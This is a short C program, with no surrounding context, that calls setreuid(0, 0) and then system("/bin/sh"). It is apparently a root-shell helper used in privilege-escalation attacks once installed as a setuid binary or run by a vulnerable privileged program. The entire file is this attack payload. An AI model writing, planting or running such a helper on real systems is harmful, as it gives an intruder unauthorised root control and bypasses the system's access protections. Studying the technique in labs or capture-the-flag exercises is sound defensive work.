#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(void) {
    setreuid(0, 0);
    system("/bin/sh");
}
